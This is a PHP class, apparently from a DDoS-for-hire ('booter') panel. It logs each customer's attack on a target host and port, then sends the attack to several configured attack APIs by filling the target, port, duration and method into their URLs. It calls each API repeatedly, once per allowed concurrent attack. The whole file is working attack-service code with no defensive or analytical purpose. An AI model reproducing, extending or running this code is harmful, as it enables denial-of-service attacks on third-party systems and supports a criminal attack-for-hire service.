<?php
require_once 'Attack.class.php';
require_once 'AttackStatus.class.php';
require_once 'Crypt.class.php';
require_once 'ConfigDB.class.php';
require_once 'cURL.class.php';
class AttackSender extends Attack {

	public function __construct($target, $port, $customer, $time, $method) {
		parent::__construct($target, $port, $customer, $time, $method);
	}
	
	public function log() {
		$newAttack = array('id' => null,'client' => $this->customer, 'target' => $this->target.':'.$this->port, 'method' => $this->method, 'time' => $this->time_boot, 'stop' => null);
		$id = $this->db->insert('logs', $newAttack);
		$this->id = $id;
	}
	
	public function execute() {
		$id = Crypt::encrypt_decrypt('encrypt', $this->id);
		$apis = ConfigDB::getParam(array('apis'));
		foreach($apis as $api)
		{
			$boot = str_replace("%host%", $this->target, $api['url']);
			$boot = str_replace("%port%", $this->port, $boot);
			$boot = str_replace("%time%", $this->time_boot, $boot);
			$boot = str_replace("%method%", $this->method, $boot);
			$boot = str_replace("%id%", $id, $boot);
			for ($i = 0; $i < $api['concurrents']; $i++)
			{
				cURL::get_url($boot, false);
			}
		}
		return $id;
	}
}
?>